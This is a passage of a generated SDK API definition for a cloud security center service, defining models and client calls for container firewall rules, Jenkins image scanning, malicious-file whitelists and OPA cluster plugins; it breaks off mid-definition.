
/**
 * @summary Creates a defense rule in the container firewall module.
 *
 * @param tmpReq CreateInterceptionRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateInterceptionRuleResponse
 */
async function createInterceptionRuleWithOptions(tmpReq: CreateInterceptionRuleRequest, runtime: Util.RuntimeOptions): CreateInterceptionRuleResponse {
  Util.validateModel(tmpReq);
  var request = new CreateInterceptionRuleShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstTargetList)) {
    request.dstTargetListShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstTargetList, 'DstTargetList', 'json');
  }
  if (!Util.isUnset(tmpReq.srcTarget)) {
    request.srcTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcTarget, 'SrcTarget', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.dstTargetListShrink)) {
    query['DstTargetList'] = request.dstTargetListShrink;
  }
  if (!Util.isUnset(request.interceptType)) {
    query['InterceptType'] = request.interceptType;
  }
  if (!Util.isUnset(request.orderIndex)) {
    query['OrderIndex'] = request.orderIndex;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  if (!Util.isUnset(request.srcTargetShrink)) {
    query['SrcTarget'] = request.srcTargetShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a defense rule in the container firewall module.
 *
 * @param request CreateInterceptionRuleRequest
 * @return CreateInterceptionRuleResponse
 */
async function createInterceptionRule(request: CreateInterceptionRuleRequest): CreateInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createInterceptionRuleWithOptions(request, runtime);
}

model CreateInterceptionTargetRequest {
  appName?: string(name='AppName', description='The name of the application to which the network object belongs.', example='frontend'),
  clusterId?: string(name='ClusterId', description='The cluster ID.', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', description='The cluster name.', example='sas-test-cnnf'),
  imageList?: [ string ](name='ImageList', description='An array that consists of the images of the network object.'),
  namespace?: string(name='Namespace', description='The namespace to which the network object belongs.

This parameter is required.', example='default'),
  tagList?: [ string ](name='TagList', description='An array that consists of the labels specified for the network object.'),
  targetName?: string(name='TargetName', description='The name of the object to be blocked.

This parameter is required.', example='test'),
  targetType?: string(name='TargetType', description='The object type. Valid value:

*   **IMAGE**

This parameter is required.', example='IMAGE'),
}

model CreateInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='5B9ECCC0-38F7-***'),
  result?: boolean(name='Result', description='The response parameters.', example='true'),
}

model CreateInterceptionTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateInterceptionTargetResponseBody(name='body'),
}

/**
 * @summary Creates a defense object.
 *
 * @param request CreateInterceptionTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateInterceptionTargetResponse
 */
async function createInterceptionTargetWithOptions(request: CreateInterceptionTargetRequest, runtime: Util.RuntimeOptions): CreateInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a defense object.
 *
 * @param request CreateInterceptionTargetRequest
 * @return CreateInterceptionTargetResponse
 */
async function createInterceptionTarget(request: CreateInterceptionTargetRequest): CreateInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return createInterceptionTargetWithOptions(request, runtime);
}

model CreateJenkinsImageRegistryRequest {
  domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
  extraParam?: string(name='ExtraParam', description='The additional parameters of the image repository. The value of this parameter contains the following fields:

*   **namespace**: the namespace
*   **authToken**: the authorization token', example='[{\\\\"namespace\\\\":\\\\"aa\\\\",\\\\"authToken\\\\":\\\\"aa\\\\"}]'),
  netType?: int32(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: Virtual Private Cloud (VPC)', example='1'),
  password?: string(name='Password', description='The password.', example='Harbor********'),
  persistenceDay?: int32(name='PersistenceDay', description='The number of days during which assets can be retained.', example='30'),
  protocolType?: int32(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1'),
  regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-shanghai'),
  registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.XXX.XXX'),
  registryName?: string(name='RegistryName', description='The alias of the image repository.', example='testRepo'),
  registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **CI/CD**: Jenkins', example='CI/CD'),
  registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Default value: -. Valid values:

*   **-**: the default version
*   **V1**: V1.0
*   **V2**: V2.0', example='V1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='41.121.XXX.XXX'),
  transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30'),
  userName?: string(name='UserName', description='The username.', example='RegistryUser'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2ze4aoqgeu51ydfb8****'),
  whiteList?: string(name='WhiteList', description='The whitelist of IP addresses.', example='192.168.XXX.XXX'),
}

model CreateJenkinsImageRegistryResponseBody = {
  data?: {
    blackList?: string(name='BlackList', description='The blacklist.', example='61.9.XXX.XXX'),
    domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
    gmtCreate?: string(name='GmtCreate', description='The creation time. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-10-16 18:17:16'),
    gmtModified?: string(name='GmtModified', description='The update time. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-11-21 10:40:01'),
    id?: long(name='Id', description='The ID of the image repository.', example='443496'),
    netType?: int32(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='1'),
    password?: string(name='Password', description='The password.', example='Harbor******'),
    persistenceDay?: int32(name='PersistenceDay', description='The number of days during which assets can be retained.', example='30'),
    protocolType?: int32(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1'),
    regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-shanghai'),
    registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='1.13.XXX.XXX'),
    registryName?: string(name='RegistryName', description='The alias of the image repository.', example='fanyi'),
    registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **CI/CD**: Jenkins', example='CI/CD'),
    token?: string(name='Token', description='The authentication token of the user.', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30'),
    userName?: string(name='UserName', description='The username.', example='RegistryUser'),
    vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2vchkxmf2j9yjt3x2****'),
    whiteList?: string(name='WhiteList', description='The whitelist.', example='192.168.XXX.XXX'),
  }(name='Data', description='The result of creating the image repository.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='1AF1E723-53F1-55BF-A4B2-15CB7A32****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

model CreateJenkinsImageRegistryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateJenkinsImageRegistryResponseBody(name='body'),
}

/**
 * @summary Creates a Jenkins image repository.
 *
 * @param request CreateJenkinsImageRegistryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateJenkinsImageRegistryResponse
 */
async function createJenkinsImageRegistryWithOptions(request: CreateJenkinsImageRegistryRequest, runtime: Util.RuntimeOptions): CreateJenkinsImageRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.domainName)) {
    body['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.extraParam)) {
    body['ExtraParam'] = request.extraParam;
  }
  if (!Util.isUnset(request.netType)) {
    body['NetType'] = request.netType;
  }
  if (!Util.isUnset(request.password)) {
    body['Password'] = request.password;
  }
  if (!Util.isUnset(request.persistenceDay)) {
    body['PersistenceDay'] = request.persistenceDay;
  }
  if (!Util.isUnset(request.protocolType)) {
    body['ProtocolType'] = request.protocolType;
  }
  if (!Util.isUnset(request.regionId)) {
    body['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.registryHostIp)) {
    body['RegistryHostIp'] = request.registryHostIp;
  }
  if (!Util.isUnset(request.registryName)) {
    body['RegistryName'] = request.registryName;
  }
  if (!Util.isUnset(request.registryType)) {
    body['RegistryType'] = request.registryType;
  }
  if (!Util.isUnset(request.registryVersion)) {
    body['RegistryVersion'] = request.registryVersion;
  }
  if (!Util.isUnset(request.transPerHour)) {
    body['TransPerHour'] = request.transPerHour;
  }
  if (!Util.isUnset(request.userName)) {
    body['UserName'] = request.userName;
  }
  if (!Util.isUnset(request.vpcId)) {
    body['VpcId'] = request.vpcId;
  }
  if (!Util.isUnset(request.whiteList)) {
    body['WhiteList'] = request.whiteList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'CreateJenkinsImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a Jenkins image repository.
 *
 * @param request CreateJenkinsImageRegistryRequest
 * @return CreateJenkinsImageRegistryResponse
 */
async function createJenkinsImageRegistry(request: CreateJenkinsImageRegistryRequest): CreateJenkinsImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return createJenkinsImageRegistryWithOptions(request, runtime);
}

model CreateJenkinsImageScanTaskRequest {
  digest?: string(name='Digest', description='The digest of the image.', example='a8c9f3765684cd8d9053db9523eab58878e99a199217500efd9ae2a860a7e01e'),
  imageCreate?: long(name='ImageCreate', description='The time when the image was created.', example='1717430400000'),
  imageId?: string(name='ImageId', description='The ID of the image.', example='b10ef7b245c34a0822055c74fc4a0e8b5baf0279306316b2c517a501ed250b1e'),
  imageSize?: long(name='ImageSize', description='The size of the image. Unit: bytes.', example='6120340'),
  imageUpdate?: long(name='ImageUpdate', description='The time when the image was updated.', example='1717430498600'),
  jenkinsEnv?: string(name='JenkinsEnv', description='The information about the Jenkins environment.', example='release'),
  namespace?: string(name='Namespace', description='The namespace.', example='lkl-zf-ss-ccss'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='sdk'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='119.136.XX.XX'),
  tag?: string(name='Tag', description='The tag of the image.', example='00f597223f-20210831-1'),
  token?: string(name='Token', description='The token that is used to access the Jenkins image repository.', example='c3de8326-273e-11fc-a0e3-d012435c****'),
  uuid?: string(name='Uuid', description='The UUID of the image asset.', example='5b268326-273e-44fc-a0e3-9482435c****'),
}

model CreateJenkinsImageScanTaskResponseBody = {
  data?: {
    imageScanCapacity?: long(name='ImageScanCapacity', description='The quota for image scan.', example='100'),
    repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-upze3gcopm9c****'),
    repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='cri-0gkaatghnmnt****'),
    repoRegionId?: string(name='RepoRegionId', description='The ID of the region.', example='cn-hangzhou'),
    taskId?: string(name='TaskId', description='The ID of the scan task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    uuid?: string(name='Uuid', description='The UUID of the image asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='52870893-48A7-5A9E-9E05-6253E5B6****'),
}

model CreateJenkinsImageScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateJenkinsImageScanTaskResponseBody(name='body'),
}

/**
 * @summary Creates a Jenkins scan task.
 *
 * @param request CreateJenkinsImageScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateJenkinsImageScanTaskResponse
 */
async function createJenkinsImageScanTaskWithOptions(request: CreateJenkinsImageScanTaskRequest, runtime: Util.RuntimeOptions): CreateJenkinsImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.jenkinsEnv)) {
    query['JenkinsEnv'] = request.jenkinsEnv;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.digest)) {
    body['Digest'] = request.digest;
  }
  if (!Util.isUnset(request.imageCreate)) {
    body['ImageCreate'] = request.imageCreate;
  }
  if (!Util.isUnset(request.imageId)) {
    body['ImageId'] = request.imageId;
  }
  if (!Util.isUnset(request.imageSize)) {
    body['ImageSize'] = request.imageSize;
  }
  if (!Util.isUnset(request.imageUpdate)) {
    body['ImageUpdate'] = request.imageUpdate;
  }
  if (!Util.isUnset(request.namespace)) {
    body['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.repoName)) {
    body['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.tag)) {
    body['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.token)) {
    body['Token'] = request.token;
  }
  if (!Util.isUnset(request.uuid)) {
    body['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'CreateJenkinsImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a Jenkins scan task.
 *
 * @param request CreateJenkinsImageScanTaskRequest
 * @return CreateJenkinsImageScanTaskResponse
 */
async function createJenkinsImageScanTask(request: CreateJenkinsImageScanTaskRequest): CreateJenkinsImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createJenkinsImageScanTaskWithOptions(request, runtime);
}

model CreateMaliciousFileWhitelistConfigRequest {
  eventName?: string(name='EventName', description='The name of the alert.

*   Set the value to ALL, which indicates all alert types.', example='ALL'),
  field?: string(name='Field', description='The field that you want to use in the whitelist rule.', example='fileMd5'),
  fieldValue?: string(name='FieldValue', description='The value of the field that you want to use in the whitelist rule.', example='b2cf9747ee49d8d9b105cf16e078cc16'),
  operator?: string(name='Operator', description='The logical operator that you want to use in the whitelist rule.

*   Set the value to strEqual, which indicates the equality operator (=).', example='strEqual'),
  source?: string(name='Source', description='The feature to which this operation belongs.

*   Set the value to agentless, which indicates the agentless detection feature.', example='agentless'),
  targetType?: string(name='TargetType', description='The type of the assets on which you want the whitelist rule to take effect. Valid values:

*   ALL: all assets
*   SELECTION_KEY: selected assets', example='ALL'),
  targetValue?: string(name='TargetValue', description='The assets on which you want the whitelist rule to take effect. Valid values:

*   ALL: all assets
*   Others: selected assets', example='ALL'),
}

model CreateMaliciousFileWhitelistConfigResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    count?: string(name='Count', description='The number of the assets on which the whitelist rule takes effect.

>  The value of this parameter is returned only if the value of TargetType is SELECTION_KEY.', example='1'),
    eventName?: string(name='EventName', description='The name of the alert.

*   The value is fixed as ALL, which indicates all alert types.', example='ALL'),
    field?: string(name='Field', description='The field that is used in the whitelist rule.', example='fileMd5'),
    fieldValue?: string(name='FieldValue', description='The value of the field that is used in the whitelist rule.', example='b2cf9747ee49d8d9b105cf16e078cc16'),
    gmtCreate?: string(name='GmtCreate', description='The creation time.', example='1671607025000'),
    gmtModified?: string(name='GmtModified', description='The modification time.', example='1671607025000'),
    id?: string(name='Id', description='The ID of the whitelist rule.', example='1'),
    operator?: string(name='Operator', description='The logical operator that is used in the whitelist rule.

*   The value is fixed as strEqual, which indicates the equality operator (=).', example='strEqual'),
    source?: string(name='Source', description='The feature to which this operation belongs.

*   The value is fixed as agentless, which indicates the agentless detection feature.', example='agentless'),
    targetType?: string(name='TargetType', description='The type of the assets on which the whitelist rule takes effect. Valid values:

*   ALL: all assets
*   SELECTION_KEY: selected assets', example='ALL'),
    targetValue?: string(name='TargetValue', description='The assets on which the whitelist rule takes effect. Valid values:

*   ALL: all assets
*   Others: selected assets', example='ALL'),
  }(name='Data', description='The response parameters.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-XXXXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model CreateMaliciousFileWhitelistConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateMaliciousFileWhitelistConfigResponseBody(name='body'),
}

/**
 * @summary Creates an alert whitelist rule of sensitive files that are detected by using the agentless detection feature.
 *
 * @param request CreateMaliciousFileWhitelistConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateMaliciousFileWhitelistConfigResponse
 */
async function createMaliciousFileWhitelistConfigWithOptions(request: CreateMaliciousFileWhitelistConfigRequest, runtime: Util.RuntimeOptions): CreateMaliciousFileWhitelistConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.field)) {
    query['Field'] = request.field;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.operator)) {
    query['Operator'] = request.operator;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.targetValue)) {
    query['TargetValue'] = request.targetValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateMaliciousFileWhitelistConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an alert whitelist rule of sensitive files that are detected by using the agentless detection feature.
 *
 * @param request CreateMaliciousFileWhitelistConfigRequest
 * @return CreateMaliciousFileWhitelistConfigResponse
 */
async function createMaliciousFileWhitelistConfig(request: CreateMaliciousFileWhitelistConfigRequest): CreateMaliciousFileWhitelistConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return createMaliciousFileWhitelistConfigWithOptions(request, runtime);
}

model CreateMaliciousNoteRequest {
  eventId?: long(name='EventId', description='The ID of the alert event to which you want to add remarks.

>  You can call the [ListAgentlessMaliciousFiles](~~ListAgentlessMaliciousFiles~~) operation to obtain the ID of the alert event from the NoteId parameter.

This parameter is required.', example='80****'),
  note?: string(name='Note', description='The remarks that you want to add.

This parameter is required.', example='Ignore'),
}

model CreateMaliciousNoteResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model CreateMaliciousNoteResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateMaliciousNoteResponseBody(name='body'),
}

/**
 * @summary Adds remarks to alert events for agentless detection.
 *
 * @param request CreateMaliciousNoteRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateMaliciousNoteResponse
 */
async function createMaliciousNoteWithOptions(request: CreateMaliciousNoteRequest, runtime: Util.RuntimeOptions): CreateMaliciousNoteResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.note)) {
    query['Note'] = request.note;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateMaliciousNote',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds remarks to alert events for agentless detection.
 *
 * @param request CreateMaliciousNoteRequest
 * @return CreateMaliciousNoteResponse
 */
async function createMaliciousNote(request: CreateMaliciousNoteRequest): CreateMaliciousNoteResponse {
  var runtime = new Util.RuntimeOptions{};
  return createMaliciousNoteWithOptions(request, runtime);
}

model CreateMonitorAccountRequest {
  accountIds?: string(name='AccountIds', description='The account IDs of members in the resource directory.

>  You can call the [ListAccountsInResourceDirectory](~~ListAccountsInResourceDirectory~~) operation to obtain the account IDs. Separate multiple account IDs with commas (,). If you specify a value for this parameter, the existing list of members is replaced by the new list that you specify. Otherwise, the existing list is cleared.', example='1026780160******,1457515594******'),
}

model CreateMonitorAccountResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model CreateMonitorAccountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateMonitorAccountResponseBody(name='body'),
}

/**
 * @summary Creates a list of members of the account monitored by Security Center type by using the multi-account management feature.
 *
 * @description You can call this operation only by using the management account of a resource directory or a delegated administrator account of Security Center.
 *
 * @param request CreateMonitorAccountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateMonitorAccountResponse
 */
async function createMonitorAccountWithOptions(request: CreateMonitorAccountRequest, runtime: Util.RuntimeOptions): CreateMonitorAccountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.accountIds)) {
    query['AccountIds'] = request.accountIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateMonitorAccount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a list of members of the account monitored by Security Center type by using the multi-account management feature.
 *
 * @description You can call this operation only by using the management account of a resource directory or a delegated administrator account of Security Center.
 *
 * @param request CreateMonitorAccountRequest
 * @return CreateMonitorAccountResponse
 */
async function createMonitorAccount(request: CreateMonitorAccountRequest): CreateMonitorAccountResponse {
  var runtime = new Util.RuntimeOptions{};
  return createMonitorAccountWithOptions(request, runtime);
}

model CreateOpaClusterPluginRequest {
  clusterIds?: [ string ](name='ClusterIds', description='The cluster IDs.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.

This parameter is required.'),
}

model CreateOpaClusterPluginResponseBody = {
  installStatus?: [ 
    {
      clusterId?: string(name='ClusterId', description='The cluster ID.', example='c60b77fe62093480db6164a3c2fa****'),
      installStatus?: boolean(name='InstallStatus', description='Indicates whether the component is installed. Valid values:

*   **true**
*   **false**', example='true'),
    }
  ](name='InstallStatus', description='The installation status of the components.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model CreateOpaClusterPluginResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateOpaClusterPluginResponseBody(name='body'),
}

/**
 * @summary Installs the components that are required by at-risk image blocking. The components are policy-template-controller, gatekeeper, and logtail-ds.
 *
 * @param request CreateOpaClusterPluginRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateOpaClusterPluginResponse
 */
async function createOpaClusterPluginWithOptions(request: CreateOpaClusterPluginRequest, runtime: Util.RuntimeOptions): CreateOpaClusterPluginResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOpaClusterPlugin',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Installs the components that are required by at-risk image blocking. The components are policy-template-controller, gatekeeper, and logtail-ds.
 *
 * @param request CreateOpaClusterPluginRequest
 * @return CreateOpaClusterPluginResponse
 */
async function createOpaClusterPlugin(request: CreateOpaClusterPluginRequest): CreateOpaClusterPluginResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOpaClusterPluginWithOptions(request, runtime);
}

model CreateOpaStrategyNewRequest {
  alarmDetail?: {
    baseline?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the baseline check item.

>  You can call the [GetOpaClusterBaseLineList](https://help.aliyun.com/document_detail/2539883.html) operation to query the ID.', example='hc.image.checklist.identify.hc_exploit_couchdb_linux.item'),
          name?: string(name='Name', description='The name of the baseline check item.

>  You can call the [GetOpaClusterBaseLineList](https://help.aliyun.com/document_detail/2539883.html) operation to query the name.', example='Unauthorized access to CouchDB configuration risk'),
        }
      ](name='Item', description='The baseline check items.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='Baseline', description='The baseline risks.'),
    buildRisk?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the image build risk.

>  You can call the [ListImageBuildRiskItem](~~ListImageBuildRiskItem~~) operation to query the ID of the malicious sample.', example='key'),
          name?: string(name='Name', description='The name of the image build risk.

>  You can call the [ListImageBuildRiskItem](~~ListImageBuildRiskItem~~) operation to query the ID of the malicious sample.', example='name'),
        }
      ](name='Item', description='The configuration of image build risk.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='BuildRisk', description='The configuration of image build risk.'),
    maliciousFile?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the malicious sample.

>  You can call the [DescribeMatchedMaliciousNames](~~DescribeMatchedMaliciousNames~~) operation to query the ID.', example='3685699'),
          name?: string(name='Name', description='The name of the malicious sample.

>  You can call the [DescribeMatchedMaliciousNames](~~DescribeMatchedMaliciousNames~~) operation to query the name.', example='abnormal binary file'),
        }
      ](name='Item', description='The malicious samples.'),
      riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
    }(name='MaliciousFile', description='The malicious sample risks.'),
    sensitiveFile?: {
      item?: [ 
        {
          id?: string(name='Id', description='The ID of the sensitive files.

